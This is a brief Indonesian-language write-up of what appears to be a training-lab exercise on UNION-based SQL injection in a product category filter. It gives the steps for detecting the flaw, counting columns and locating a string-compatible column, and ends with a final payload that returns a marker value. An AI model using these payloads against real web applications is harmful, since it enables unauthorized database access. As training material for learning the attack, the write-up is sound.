# Overview
SQLI vuln di bagian Product Category Filter

Hint:
- UNION lagi
- kompatibel dengan `string` data

Goals:
- perform SQLI untuk return additional row berisi value '1iWYWI'


# Analisis
cek apakah vuln dengan SQLI dengan `'` atau `'--`

lalu cek jumlah kolom `' order by 3--` atau `' union select null,null,null`

lalu cek kolom yang dapat hold string value dari chellange dengan `' union select '1iWYWI',null,null--`

Payload:
- `' union select null,'1iWYWI',null--`